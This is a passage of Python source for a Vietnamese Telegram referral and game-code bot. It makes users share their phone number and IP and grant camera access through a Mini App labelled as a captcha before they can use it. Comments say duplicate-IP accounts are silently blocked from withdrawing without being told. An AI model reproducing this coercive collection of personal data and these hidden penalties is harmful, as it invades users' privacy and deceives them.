    if re.fullmatch(r"[A-Za-z0-9_]{4,}", raw):
        return "@" + raw
    return None


def _api_chat_id(ref: str):
    return int(ref) if ref.lstrip("-").isdigit() else ref


async def get_required_channels():
    return (
        await db_query(
            "SELECT id, chat_ref, title, invite_url FROM required_channels ORDER BY id ASC",
            fetchall=True,
        )
        or []
    )


async def check_bot_admin(bot, ref: str):
    try:
        chat = await bot.get_chat(_api_chat_id(ref))
        me = await bot.get_me()
        m = await bot.get_chat_member(chat.id, me.id)
        return (m.status in ("administrator", "creator")), m.status, chat
    except Exception as exc:
        return False, f"lỗi: {exc}", None


def _menu_btn(text: str, key: str) -> KeyboardButton:
    return KeyboardButton(
        text, api_kwargs={"icon_custom_emoji_id": MENU_ICON_IDS[key]}
    )


def get_main_keyboard(user_id=None):
    keyboard = [
        [_menu_btn("Tài Khoản", "account"), _menu_btn("Mời Bạn Bè", "invite")],
        [_menu_btn("Rút Code", "withdraw"), _menu_btn("Top", "top")],
        [
            _menu_btn("Nhóm Hỗ Trợ", "support"),
            _menu_btn("Lịch Sử Giao Dịch", "history"),
        ],
        [_menu_btn("Link Game", "game")],
    ]
    if user_id in ADMIN_IDS:
        keyboard.append([_menu_btn("Menu", "admin")])
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)


def get_game_link_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Nhập Code Tại Đây", url=GAME_CODE_URL)],
        [InlineKeyboardButton("Link room tại đây", url=GAME_ROOM_URL)],
    ])


def get_contact_keyboard():
    keyboard = [
        [KeyboardButton("📱 Chia sẻ số điện thoại", request_contact=True)]
    ]
    return ReplyKeyboardMarkup(
        keyboard, resize_keyboard=True, one_time_keyboard=True
    )


def get_miniapp_keyboard(token: str = None):
    url = MINI_APP_URL
    if token:
        url = f"{MINI_APP_URL}{'&' if '?' in MINI_APP_URL else '?'}t={token}"
    keyboard = [[
        KeyboardButton(
            "🌐 BẤM VÀO ĐÂY ĐỂ XÁC MINH IP",
            web_app=WebAppInfo(url=url),
        )
    ]]
    return ReplyKeyboardMarkup(
        keyboard, resize_keyboard=True, one_time_keyboard=True
    )


fn_miniapp_captcha_url = lambda token: f"{MINI_APP_URL}{'&' if '?' in MINI_APP_URL else '?' }mode=captcha&token={token}"


def get_miniapp_captcha_keyboard(token: str):
    keyboard = [[KeyboardButton(
        "🧩 XÁC MINH CAPTCHA & TRUY CẬP CAMERA",
        web_app=WebAppInfo(url=fn_miniapp_captcha_url(token)),
    )]]
    return ReplyKeyboardMarkup(
        keyboard, resize_keyboard=True, one_time_keyboard=True
    )


async def prompt_miniapp_captcha_verification(
    message_or_bot, user_id, is_retry=False
):
    existing = pending_miniapp_captcha.get(user_id)
    if existing and datetime.now() <= existing["expires_at"] and not is_retry:
        token = existing["token"]
    else:
        token = secrets.token_urlsafe(12)
        pending_miniapp_captcha[user_id] = {
            "token": token,
            "expires_at": datetime.now()
            + timedelta(minutes=MINIAPP_CAPTCHA_TTL_MINUTES),
        }

    try:
        await asyncio.to_thread(
            _save_miniapp_token_sync, pending_miniapp_captcha[user_id]["token"], user_id
        )
    except Exception as exc:
        logger.warning("Không lưu được token MiniApp: %s", exc)

    msg = (
        f"{E['SHIELD']} <b>XÁC MINH CAPTCHA & TRUY CẬP CAMERA</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{E['WARN']} Bạn <b>bắt buộc</b> phải hoàn thành captcha và cho phép truy cập camera trong Mini App mới được sử dụng bot.\n"
        f"{E['HOURGLASS']} Hiệu lực: <b>{MINIAPP_CAPTCHA_TTL_MINUTES} phút</b>\n"
        f"{E['RIGHT']} Nhấn nút <b>🧩 XÁC MINH CAPTCHA & TRUY CẬP CAMERA</b> bên dưới và hoàn thành thao tác!"
    )
    kb = get_miniapp_captcha_keyboard(token)
    if hasattr(message_or_bot, "reply_text"):
        await message_or_bot.reply_text(
            msg, reply_markup=kb, parse_mode="HTML"
        )
    else:
        await message_or_bot.send_message(
            chat_id=user_id, text=msg, reply_markup=kb, parse_mode="HTML"
        )


async def proceed_next_verification(
    update_or_msg, context: ContextTypes.DEFAULT_TYPE, user
):
    user_id = user.id

    if await get_verify_setting("verify_phone"):
        if not await check_phone_verified(user_id) and user_id not in ADMIN_IDS:
            await prompt_phone_verification(update_or_msg, user_id)
            return

    if await get_verify_setting("verify_cccam"):
        if not await check_cccam_verified(user_id) and user_id not in ADMIN_IDS:
            await prompt_miniapp_captcha_verification(update_or_msg, user_id)
            return

    if await get_verify_setting("verify_miniapp_captcha") or await get_verify_setting(
        "verify_camera"
    ):
        if (
            not await check_miniapp_captcha_verified(user_id)
            or not await check_camera_verified(user_id)
        ) and user_id not in ADMIN_IDS:
            await prompt_miniapp_captcha_verification(update_or_msg, user_id)
            return

    if await get_verify_setting("verify_ip"):
        if not await check_ip_verified(user_id) and user_id not in ADMIN_IDS:
            await prompt_ip_verification(update_or_msg, user_id)
            return

    if await get_verify_setting("verify_captcha"):
        if not await check_captcha_verified(user_id) and user_id not in ADMIN_IDS:
            if user_id in pending_captcha_users:
                return
            await send_captcha_challenge(update_or_msg, context, user_id)
            return

    if await get_verify_setting("verify_channel"):
        if user_id not in ADMIN_IDS:
            missing_channels = await get_missing_channels(context.bot, user_id)
            if missing_channels:
                buttons = build_channel_buttons(missing_channels)
                missing_text = "\n".join([
                    f"• <b>{ch}</b>" for ch in missing_channels
                ])
                msg = (
                    f"{E['BANDAGE']} <b>BẠN CHƯA THAM GIA ĐỦ CÁC KÊNH/NHÓM!</b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"{E['WARN']} Bạn còn thiếu <b>{len(missing_channels)}</b> kênh/nhóm sau:\n\n"
                    f"{missing_text}\n\n"
                    f"{E['RIGHT']} Vui lòng tham gia đầy đủ rồi bấm nút <b>XÁC NHẬN ĐÃ THAM GIA</b> bên dưới!"
                )
                if hasattr(update_or_msg, "reply_text"):
                    await update_or_msg.reply_text(
                        msg,
                        reply_markup=InlineKeyboardMarkup(buttons),
                        parse_mode="HTML",
                    )
                else:
                    await context.bot.send_message(
                        chat_id=user_id,
                        text=msg,
                        reply_markup=InlineKeyboardMarkup(buttons),
                        parse_mode="HTML",
                    )
                return

    await finalize_user_registration(user, context)


async def handle_anti_spam(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user = update.effective_user
    if not user or user.id in ADMIN_IDS:
        return False
    uid = user.id
    now = time.time()

    ban_until = temp_bans.get(uid)
    if ban_until:
        if now < ban_until:
            return True
        temp_bans.pop(uid, None)
        user_msg_tracker.pop(uid, None)

    timestamps = [t for t in user_msg_tracker[uid] if now - t <= SPAM_WINDOW_SECONDS]
    timestamps.append(now)
    user_msg_tracker[uid] = timestamps

    if len(timestamps) > SPAM_MAX_MESSAGES:
        temp_bans[uid] = now + TEMP_BAN_MINUTES * 60
        user_msg_tracker.pop(uid, None)
        try:
            await context.bot.send_message(
                chat_id=uid,
                text=(
                    f"{E['WARN']} <b>BẠN GỬI TIN NHẮN QUÁ NHANH!</b>\n"
                    f"Tạm khóa thao tác trong <b>{TEMP_BAN_MINUTES} phút</b>."
                ),
                parse_mode="HTML",
            )
        except Exception:
            pass
        return True
    return False


async def ensure_user_exists(update: Update):
    user = update.effective_user
    if not user:
        return None
    q = (
        "SELECT user_id, balance, username, is_banned, is_withdraw_banned, "
        "referrer_id, phone_number, " + IP_SUB + " FROM users WHERE user_id=%s"
    )
    row = await db_query(q, (user.id,), fetchone=True)
    if not row:
        await db_query(
            "INSERT INTO users (user_id, username, balance, joined_at) "
            "VALUES (%s, %s, 0, %s) ON CONFLICT (user_id) DO NOTHING",
            (user.id, user.username or "", get_now_str()),
            commit=True,
        )
        row = await db_query(q, (user.id,), fetchone=True)
    return row


async def _check_flag(user_id: int, column: str) -> bool:
    res = await db_query(
        f"SELECT {column} FROM users WHERE user_id=%s", (user_id,), fetchone=True
    )
    return bool(res and res[0] == 1)


async def check_phone_verified(user_id: int) -> bool:
    res = await db_query(
        "SELECT phone_number FROM users WHERE user_id=%s", (user_id,), fetchone=True
    )
    return bool(res and res[0])


async def check_ip_verified(user_id: int) -> bool:
    res = await db_query(
        "SELECT u.skip_ip, EXISTS(SELECT 1 FROM ip_logs l WHERE l.user_id=u.user_id) "
        "FROM users u WHERE u.user_id=%s",
        (user_id,),
        fetchone=True,
    )
    return bool(res and (res[0] == 1 or res[1]))


async def check_captcha_verified(user_id: int) -> bool:
    return await _check_flag(user_id, "captcha_verified")


async def check_miniapp_captcha_verified(user_id: int) -> bool:
    return await _check_flag(user_id, "miniapp_captcha_verified")


async def check_camera_verified(user_id: int) -> bool:
    return await _check_flag(user_id, "camera_verified")


async def check_cccam_verified(user_id: int) -> bool:
    return await _check_flag(user_id, "cccam_verified")


async def _send_to(message_or_bot, user_id, text, reply_markup=None):
    if hasattr(message_or_bot, "reply_text"):
        await message_or_bot.reply_text(
            text, reply_markup=reply_markup, parse_mode="HTML"
        )
    else:
        await message_or_bot.send_message(
            chat_id=user_id, text=text, reply_markup=reply_markup, parse_mode="HTML"
        )


async def prompt_phone_verification(message_or_bot, user_id):
    await _send_to(
        message_or_bot,
        user_id,
        f"{E['PHONE']} <b>XÁC MINH SỐ ĐIỆN THOẠI</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{E['WARN']} Bạn cần chia sẻ số điện thoại <b>Việt Nam (+84)</b> của chính mình để tiếp tục.\n"
        f"{E['RIGHT']} Nhấn nút <b>📱 Chia sẻ số điện thoại</b> bên dưới!",
        get_contact_keyboard(),
    )


async def prompt_ip_verification(message_or_bot, user_id):
    ip_token = secrets.token_urlsafe(12)
    try:
        await asyncio.to_thread(_save_miniapp_token_sync, ip_token, user_id)
    except Exception as exc:
        logger.warning("Không lưu được token IP MiniApp: %s", exc)
        ip_token = None
    await _send_to(
        message_or_bot,
        user_id,
        f"{E['GLOBE']} <b>XÁC MINH IP</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{E['WARN']} Bạn cần xác minh địa chỉ IP qua Mini App để tiếp tục.\n"
        f"{E['RIGHT']} Nhấn nút <b>🌐 BẤM VÀO ĐÂY ĐỂ XÁC MINH IP</b> bên dưới!",
        get_miniapp_keyboard(ip_token),
    )


def _make_captcha_image(code: str) -> io.BytesIO:
    w, h = 260, 100
    img = Image.new("RGB", (w, h), (245, 245, 245))
    draw = ImageDraw.Draw(img)
    font = None
    for path in (
        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
        "/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf",
        "DejaVuSans-Bold.ttf",
        "arial.ttf",
    ):
        try:
            font = ImageFont.truetype(path, 52)
            break
        except Exception:
            continue
    if font is None:
        font = ImageFont.load_default()

    for _ in range(8):
        draw.line(
            [(random.randint(0, w), random.randint(0, h)),
             (random.randint(0, w), random.randint(0, h))],
            fill=(random.randint(120, 200),) * 3,
            width=2,
        )
    x = 18
    for ch in code:
        y = random.randint(8, 24)
        draw.text(
            (x, y),
            ch,
            font=font,
            fill=(random.randint(0, 100), random.randint(0, 100), random.randint(0, 100)),
        )
        x += 46
    for _ in range(150):
        draw.point(
            (random.randint(0, w - 1), random.randint(0, h - 1)),
            fill=(random.randint(0, 255),) * 3,
        )
    bio = io.BytesIO()
    img.save(bio, format="PNG")
    bio.seek(0)
    bio.name = "captcha.png"
    return bio


async def send_captcha_challenge(update_or_msg, context: ContextTypes.DEFAULT_TYPE, user_id: int):
    alphabet = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    code = "".join(random.choice(alphabet) for _ in range(5))
    old = pending_captcha_users.get(user_id) or {}
    pending_captcha_users[user_id] = {
        "code": code,
        "expires_at": datetime.now() + timedelta(minutes=5),
        "attempts": old.get("attempts", 0),
    }
    await context.bot.send_photo(
        chat_id=user_id,
        photo=_make_captcha_image(code),
        caption=(
            f"{E['SHIELD']} <b>XÁC MINH CAPTCHA</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"{E['RIGHT']} Nhập đúng <b>5 ký tự</b> trong ảnh (không phân biệt hoa/thường).\n"
            f"{E['HOURGLASS']} Hiệu lực: <b>5 phút</b>"
        ),
        parse_mode="HTML",
        reply_markup=ReplyKeyboardRemove(),
    )


async def handle_captcha_input(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, user_input: str) -> bool:
    pending = pending_captcha_users.get(user_id)
    message = update.effective_message
    user = update.effective_user
    if not pending or not message or not user:
        return False

    if datetime.now() > pending["expires_at"]:
        pending_captcha_users.pop(user_id, None)
        await message.reply_text(
            f"{E['HOURGLASS']} <b>Captcha đã hết hạn!</b> Đang tạo mã mới...",
            parse_mode="HTML",
        )
        await send_captcha_challenge(message, context, user_id)
        return True

    if user_input.strip().upper() == pending["code"]:
        pending_captcha_users.pop(user_id, None)
        await db_query(
            "UPDATE users SET captcha_verified=1 WHERE user_id=%s",
            (user_id,),
            commit=True,
        )
        await message.reply_text(
            f"{E['CHECK']} Xác minh Captcha thành công!\n\n"
            f"{E['HOURGLASS']} Đang kiểm tra điều kiện tiếp theo...",
            parse_mode="HTML",
        )
        await proceed_next_verification(message, context, user)
        return True

    pending["attempts"] += 1
    if pending["attempts"] >= 5:
        pending_captcha_users.pop(user_id, None)
        await message.reply_text(
            f"{E['CROSS']} <b>Sai quá 5 lần!</b> Đang tạo captcha mới...",
            parse_mode="HTML",
        )
    else:
        await message.reply_text(
            f"{E['CROSS']} <b>Sai captcha!</b> Còn <b>{5 - pending['attempts']}</b> lần thử. Đang tạo mã mới...",
            parse_mode="HTML",
        )
    await send_captcha_challenge(message, context, user_id)
    return True


async def _is_member(bot, chat_ref: str, user_id: int) -> bool:
    try:
        m = await bot.get_chat_member(_api_chat_id(chat_ref), user_id)
        if m.status in ("member", "administrator", "creator"):
            return True
        if m.status == "restricted":
            return bool(getattr(m, "is_member", True))
        return False
    except Exception as exc:
        logger.warning("Không check được thành viên %s ở %s: %s", user_id, chat_ref, exc)
        return False


async def get_missing_channels(bot, user_id: int):
    rows = await get_required_channels()
    if not rows:
        return []
    results = await asyncio.gather(*[_is_member(bot, r[1], user_id) for r in rows])
    missing = []
    for (rid, ref, title, url), joined in zip(rows, results):
        if not joined:
            name = title or ref
            missing.append(name)
            CHANNEL_URLS[name] = url or (
                f"https://t.me/{ref.lstrip('@')}" if ref.startswith("@") else None
            )
    return missing


def build_channel_buttons(missing_channels):
    buttons = []
    for name in missing_channels:
        url = CHANNEL_URLS.get(name)
        if url:
            buttons.append([ibtn(f"Tham gia {name}"[:60], random.choice(JOIN_BTN_EMOJI_IDS), url=url)])
    buttons.append([ibtn("XÁC NHẬN ĐÃ THAM GIA", CONFIRM_JOIN_EMOJI_ID, callback_data="verify_join")])
    return buttons


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if await handle_anti_spam(update, context):
        return
    user = update.effective_user
    chat = update.effective_chat
    if not user or not chat:
        return
    if chat.type != "private":
        await db_query(
            "INSERT INTO groups(chat_id) VALUES(%s) ON CONFLICT (chat_id) DO NOTHING",
            (chat.id,),
            commit=True,
        )
        return
    if await is_maintenance() and user.id not in ADMIN_IDS:
        await update.message.reply_text(
            f"{E['BANDAGE']} <b>HỆ THỐNG ĐANG BẢO TRÌ</b>\n"
            f"Bot đang thực hiện nâng cấp định kỳ, vui lòng quay lại sau!",
            parse_mode="HTML",
        )
        return

    db_user = await db_query(
        "SELECT user_id, is_banned, referrer_id, phone_number, " + IP_SUB + ", skip_ip, captcha_verified FROM users WHERE user_id=%s",
        (user.id,),
        fetchone=True,
    )

    if db_user and db_user[1] == 1:
        user_ip = (
            db_user[4] if (len(db_user) > 4 and db_user[4]) else "Không xác định"
        )
        await update.message.reply_text(
            f"{E['GLOBE']} <b>PHÁT HIỆN TRÙNG IP!</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Địa chỉ IP <code>{user_ip}</code> đã được tài khoản khác sử dụng.\n"
            f"Tài khoản của bạn đã bị <b>khóa vĩnh viễn</b> do trùng IP và full thông tin!",
            parse_mode="HTML",
            reply_markup=ReplyKeyboardRemove(),
        )
        return

    referrer_id = None
    if not db_user:
        if context.args:
            try:
                ref_id = int(context.args[0])
                if ref_id != user.id:
                    ref_exists = await db_query(
                        "SELECT user_id FROM users WHERE user_id=%s",
                        (ref_id,),
                        fetchone=True,
                    )
                    if ref_exists:
                        referrer_id = ref_id
            except (ValueError, TypeError):
                pass

        await db_query(
            "INSERT INTO users (user_id, username, balance, referrer_id, joined_at) VALUES (%s, %s, 0, %s, %s) ON CONFLICT (user_id) DO NOTHING",
            (user.id, user.username or "", referrer_id, get_now_str()),
            commit=True,
        )
    else:
        await db_query(
            "UPDATE users SET username=%s WHERE user_id=%s",
            (user.username or "", user.id),
            commit=True,
        )

    await proceed_next_verification(update.message, context, user)


async def verify_join_callback(
    update: Update, context: ContextTypes.DEFAULT_TYPE
):
    query = update.callback_query
    if not query:
        return
    user = query.from_user
    try:
        await query.answer()
    except Exception:
        pass
    if await is_maintenance() and user.id not in ADMIN_IDS:
        try:
            await query.answer("🔴 Hệ thống đang bảo trì.", show_alert=True)
        except Exception:
            pass
        return

    missing_channels = await get_missing_channels(context.bot, user.id)
    if missing_channels:
        buttons = build_channel_buttons(missing_channels)
        missing_text = "\n".join([f"• <b>{ch}</b>" for ch in missing_channels])
        try:
            await query.edit_message_text(
                f"{E['BANDAGE']} <b>BẠN CHƯA THAM GIA ĐỦ CÁC KÊNH/NHÓM!</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"{E['WARN']} Bạn vẫn chưa tham gia đủ <b>{len(missing_channels)}</b> kênh/nhóm sau:\n\n"
                f"{missing_text}\n\n"
                f"{E['RIGHT']} Vui lòng tham gia đầy đủ rồi bấm nút bên dưới để xác nhận lại!",
                reply_markup=InlineKeyboardMarkup(buttons),
                parse_mode="HTML",
            )
        except Exception:
            pass
        return

    if await get_verify_setting("verify_captcha") and not await check_captcha_verified(
        user.id
    ):
        try:
            await query.delete_message()
        except Exception:
            pass
        await send_captcha_challenge(query.message, context, user.id)
    else:
        try:
            await query.delete_message()
        except Exception:
            pass
        await finalize_user_registration(user, context)


async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.effective_message
    user = update.effective_user
    if not message or not message.contact or not user:
        return
    contact = message.contact
    if contact.user_id != user.id:
        await message.reply_text(
            f"{E['CROSS']} <b>Số điện thoại xác minh không thuộc về tài khoản Telegram này!</b>",
            parse_mode="HTML",
            reply_markup=get_contact_keyboard(),
        )
        return
    phone = contact.phone_number or ""
    if not (phone.startswith("84") or phone.startswith("+84")):
        await message.reply_text(
            f"{E['CROSS']} <b>Yêu cầu bị từ chối!</b>\nHệ thống chỉ chấp nhận số điện thoại Việt Nam (+84).",
            parse_mode="HTML",
            reply_markup=get_contact_keyboard(),
        )
        return
    full_name = f"{user.first_name or ''} {user.last_name or ''}".strip()
    if len(full_name) > 20:
        await message.reply_text(
            f"{E['CROSS']} <b>Tên hiển thị không hợp lệ!</b>\n"
            f"Tên tài khoản của bạn hiện dài <b>{len(full_name)}</b> ký tự (yêu cầu không quá 20 ký tự).\n"
            f"Vui lòng đổi lại tên hiển thị ngắn hơn và thử lại!",
            parse_mode="HTML",
            reply_markup=get_contact_keyboard(),
        )
        return
    if not user.username:
        await message.reply_text(
            f"{E['CROSS']} <b>Chưa thiết lập Username!</b>\n"
            f"Tài khoản của bạn chưa cài đặt username (@username).\n"
            f"Vui lòng truy cập Cài đặt Telegram -> Tạo Username rồi nhấn xác minh lại!",
            parse_mode="HTML",
            reply_markup=get_contact_keyboard(),
        )
        return
    try:
        user_photos = await context.bot.get_user_profile_photos(user.id, limit=1)
        if user_photos.total_count == 0:
            await message.reply_text(
                f"{E['CROSS']} <b>Thiếu ảnh đại diện!</b>\n"
                f"Tài khoản của bạn cần phải có ảnh đại diện (avatar).\n"
                f"Vui lòng cập nhật ảnh đại diện cho Telegram rồi thử lại!",
                parse_mode="HTML",
                reply_markup=get_contact_keyboard(),
            )
            return
    except Exception as exc:
        logger.warning(f"Lỗi kiểm tra avatar user {user.id}: {exc}")

    await db_query(
        "UPDATE users SET phone_number=%s WHERE user_id=%s",
        (phone, user.id),
        commit=True,
    )
    await message.reply_text(
        f"{E['CHECK']} Xác minh số điện thoại thành công!\n\n"
        f"{E['HOURGLASS']} Đang kiểm tra điều kiện tiếp theo...",
        parse_mode="HTML",
        reply_markup=ReplyKeyboardRemove(),
    )
    await proceed_next_verification(message, context, user)


async def handle_miniapp_captcha_data(
    message, context: ContextTypes.DEFAULT_TYPE, user, data: dict
):
    uid = user.id

    if (
        not await get_verify_setting("verify_miniapp_captcha")
        and not await get_verify_setting("verify_camera")
        and not await get_verify_setting("verify_cccam")
    ):
        await proceed_next_verification(message, context, user)
        return

    pending = pending_miniapp_captcha.get(uid)
    token_from_app = str(data.get("token", "")) if data.get("token") else None
    not_expired = bool(pending and datetime.now() <= pending["expires_at"])
    passed = (
        data.get("passed") is True
        or data.get("type") in ("camera_snapshot", "cccam")
    )

    token_ok = True
    if token_from_app is not None and pending:
        token_ok = token_from_app == pending["token"]

    if not (pending and not_expired and token_ok and passed):
        await message.reply_text(
            f"{E['CROSS']} <b>Xác minh captcha MiniApp thất bại!</b>\n"
            f"{E['WARN']} Vui lòng bấm lại nút <b>🧩 XÁC MINH CAPTCHA & TRUY CẬP CAMERA</b> và hoàn thành đúng.",
            parse_mode="HTML",
            reply_markup=ReplyKeyboardRemove(),
        )
        if not (pending and not_expired):
            pending_miniapp_captcha.pop(uid, None)
            await prompt_miniapp_captcha_verification(message, uid, is_retry=True)
        else:
            await prompt_miniapp_captcha_verification(message, uid)
        return

    camera_token = pending["token"] if pending else None

    # --- GHI IP cùng lúc với captcha + camera ---
    # IP ưu tiên lấy từ server (/api/save-photo), nếu MiniApp gửi kèm thì dùng làm dự phòng.
    user_ip = pending_miniapp_ip.get(uid) or normalize_ip(data.get("ip"))
    if not user_ip:
        existing_ips = await get_user_ips(uid)
        user_ip = existing_ips[0] if existing_ips else ""
    if not user_ip and not user_id_is_admin(uid):
        await message.reply_text(
            f"{E['CROSS']} <b>Không ghi nhận được địa chỉ IP!</b>\n"
            f"{E['WARN']} Vui lòng mở lại MiniApp, cho phép Camera và chờ hệ thống ghi nhận IP rồi thử lại.",
            parse_mode="HTML",
            reply_markup=ReplyKeyboardRemove(),
        )
        pending_miniapp_captcha.pop(uid, None)
        await prompt_miniapp_captcha_verification(message, uid, is_retry=True)
        return

    pending_miniapp_captcha.pop(uid, None)
    pending_miniapp_ip.pop(uid, None)

    await db_query(
        "UPDATE users SET miniapp_captcha_verified=1, camera_verified=1, cccam_verified=1, "
        "camera_photo_token=COALESCE(%s, camera_photo_token) WHERE user_id=%s",
        (camera_token, uid),
        commit=True,
    )

    # Lưu IP vào hệ thống + kiểm tra trùng + tự khóa rút code + báo admin
    result = await register_user_ip(uid, user_ip) if user_ip else None
    if result and result["duplicate"]:
        # Âm thầm khóa rút code + báo admin, KHÔNG báo gì cho người dùng
        for locked_id in result["locked_ids"]:
            user_withdraw_state.pop(locked_id, None)
    await message.reply_text(
        f"{E['CHECK']} Xác minh Captcha, Camera & IP thành công!\n\n"
        f"{E['HOURGLASS']} Đang kiểm tra điều kiện tiếp theo...",
        parse_mode="HTML",
        reply_markup=ReplyKeyboardRemove(),
    )
    await proceed_next_verification(message, context, user)


async def web_app_data_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.effective_message
    user = update.effective_user
    if not message or not message.web_app_data or not user:
        return
    try:
        raw_data = message.web_app_data.data
        try:
            data = json.loads(raw_data)
        except Exception:
            data = {"type": "camera_snapshot"}

        dtype = data.get("type")

        if dtype == "camera_denied":
            await db_query(
                "UPDATE users SET captcha_verified=0, miniapp_captcha_verified=0, camera_verified=0, cccam_verified=0 WHERE user_id=%s",
                (user.id,),
                commit=True,
            )
            pending_miniapp_captcha.pop(user.id, None)
            pending_captcha_users.pop(user.id, None)
            pending_camera_verified.discard(user.id)

            await message.reply_text(
                f"{E['WARN']} <b>VUI LÒNG CHO PHÉP TRUY CẬP CAMERA!</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"{E['CROSS']} Bạn đã <b>từ chối</b> quyền truy cập Camera.\n"
                f"{E['WARN']} Xác minh bị hủy bỏ và bước Captcha chưa được hoàn thành.\n\n"
                f"{E['REFRESH']} Vui lòng bấm lại nút bên dưới và đồng ý cấp quyền Camera khi được hỏi.",
                parse_mode="HTML",
                reply_markup=ReplyKeyboardRemove(),
            )
            await prompt_miniapp_captcha_verification(
                message, user.id, is_retry=True
            )
            return

        is_verify_payload = (
            dtype in ("miniapp_captcha", "camera_snapshot", "cccam")
            or "token" in data
            or "passed" in data
        )

        if is_verify_payload:
            await handle_miniapp_captcha_data(message, context, user, data)
            return

        user_ip = normalize_ip(data.get("ip"))
        if not user_ip:
            await message.reply_text(
                f"{E['CROSS']} Không lấy được thông tin IP. Vui lòng thử lại!",
                parse_mode="HTML",
            )
            return

        # IP lưu ở bảng ip_logs (không ghi vào thông tin tài khoản)
        result = await register_user_ip(user.id, user_ip)
        if result and result["duplicate"]:
            # Âm thầm khóa rút code + báo admin, KHÔNG báo gì cho người dùng
            for locked_id in result["locked_ids"]:
                user_withdraw_state.pop(locked_id, None)
        await message.reply_text(
            f"{E['CHECK']} Xác minh IP thành công!\n\n"
            f"{E['HOURGLASS']} Đang kiểm tra điều kiện tiếp theo...",
            parse_mode="HTML",
            reply_markup=ReplyKeyboardRemove(),
        )
        await proceed_next_verification(message, context, user)

    except Exception as exc:
        logger.exception("Lỗi khi xử lý dữ liệu từ MiniApp: %s", exc)
        try:
            await message.reply_text(
                f"{E['CROSS']} Có lỗi xảy ra trong quá trình xác minh.",
                parse_mode="HTML",
            )
        except Exception:
            pass


async def finalize_user_registration(user, context: ContextTypes.DEFAULT_TYPE):
    try:
        chat_full = await context.bot.get_chat(user.id)
        bio = chat_full.bio or ""
        if BIO_FLAG in bio.lower():
            db_user_info = await db_query(
                "SELECT referrer_id FROM users WHERE user_id=%s",
                (user.id,),
                fetchone=True,
            )
            referrer_id = db_user_info[0] if db_user_info else None

            await db_query(
                "UPDATE users SET is_banned=1, is_withdraw_banned=1 WHERE user_id=%s",
                (user.id,),
                commit=True,
            )

            if referrer_id:
                await db_query(
                    "UPDATE users SET is_banned=1, is_withdraw_banned=1 WHERE user_id=%s",
                    (referrer_id,),
                    commit=True,
                )
                try:
                    await context.bot.send_message(
                        chat_id=referrer_id,
                        text="🚨 <b>TÀI KHOẢN CỦA BẠN ĐÃ BỊ KHÓA VĨNH VIỄN!</b>\n━━━━━━━━━━━━━━━━━━\nBuff ref khoá vĩnh viễn, cần hỗ trợ nhắn qua @dgfrutil",
                        parse_mode="HTML",
                    )
                except Exception:
                    pass

            await context.bot.send_message(
                chat_id=user.id,
                text=f"🚨 <b>TÀI KHOẢN CỦA BẠN ĐÃ BỊ KHÓA VĨNH VIỄN!</b>\n━━━━━━━━━━━━━━━━━━\nLý do: Phát hiện tiểu sử (`bio`) chứa `@Lienminhvietnam`.",
                parse_mode="HTML",
                reply_markup=ReplyKeyboardRemove(),
            )
            return
    except Exception as exc:
        logger.warning(
            f"Lỗi kiểm tra bio khi đăng ký cho user {user.id}: {exc}"
        )

    db_user = await db_query(
        "SELECT referrer_id FROM users WHERE user_id=%s",
        (user.id,),
        fetchone=True,
    )
    if db_user and db_user[0]:
        ref_id = db_user[0]
        try:

            def reward_referrer(cursor):
                detail_exact = f"Mời {user.id}"
                cursor.execute(
                    "SELECT id FROM transactions WHERE user_id=%s AND type='Thưởng Mời Bạn' AND details=%s",
                    (ref_id, detail_exact),
                )
                if cursor.fetchone():
                    return False
                cursor.execute(
                    "INSERT INTO transactions (user_id, type, amount, status, created_at, details) VALUES (%s, %s, %s, %s, %s, %s) ON CONFLICT DO NOTHING",
                    (
                        ref_id,
                        "Thưởng Mời Bạn",
                        REFERRAL_REWARD,
                        "Thành công",
                        get_now_str(),
                        detail_exact,
                    ),
                )
                if cursor.rowcount == 0:
                    return False
                cursor.execute(
                    "UPDATE users SET balance = balance + %s WHERE user_id=%s",
                    (REFERRAL_REWARD, ref_id),
                )
                return True

            rewarded = await db_transaction(reward_referrer)
            if rewarded:
                username_str = (
                    f"@{user.username}" if user.username else str(user.id)
                )
                try:
                    await context.bot.send_message(
                        chat_id=ref_id,
                        text=(
                            f"{E['LOVE_FACE']} <b>THƯỞNG MỜI BẠN BÈ!</b>\n"
                            f"{E['MONEY_FLY']} Bạn nhận được <b>+{REFERRAL_REWARD:,}đ</b>\n"
                            f"{E['RIGHT']} Từ người dùng: <b>{username_str}</b>"
                        ),
                        parse_mode="HTML",
                    )
                except Exception as exc:
                    logger.warning("Không gửi được thông báo referrer: %s", exc)
        except Exception as exc:
            logger.exception("Lỗi transaction thưởng giới thiệu: %s", exc)

    await context.bot.send_message(
        chat_id=user.id,
        text=(
            f"{E['CHECK2']} <b>XÁC MINH THÀNH CÔNG!</b>\n"
            f"{E['TOP']} <b>Chào mừng bạn đã gia nhập hệ thống Bot VIP!</b>"
        ),
        reply_markup=get_main_keyboard(user.id),
        parse_mode="HTML",
    )


def build_buy_success_text(code_val: str) -> str:
    return (
        f"{E['LOVE_FACE']} <b>MUA CODE THÀNH CÔNG!</b> {E['FIRE']}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{E['MONEY']} Số tiền mua: <b>{CODE_PRICE:,}đ</b>\n"
        f"{E['CARD']} Mã Code: <code>{code_val}</code>\n"
        f"{E['STAR']} Giá trị Code: <b>7.777-15.888</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
